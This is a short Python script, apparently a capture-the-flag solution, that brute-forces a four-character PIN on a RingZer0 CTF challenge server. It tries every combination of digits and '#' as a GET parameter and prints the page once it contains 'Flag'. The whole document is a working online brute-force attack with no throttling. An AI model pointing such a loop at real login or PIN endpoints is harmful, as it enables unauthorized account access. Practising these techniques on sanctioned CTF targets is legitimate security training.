import requests
import itertools
from urllib.parse import unquote

chars = "0123456789#"
url = "http://challenges.ringzer0ctf.com:10155/"

for combo in itertools.product(chars, repeat=4):
    pin = "".join(combo)
    r = requests.get(url, params={"pincode": pin})
    if "Flag" in r.text:
        print(f"[!] Trouvé : {pin} — Status: {r.status_code}")
        print(r.text)
        break
    print(pin)
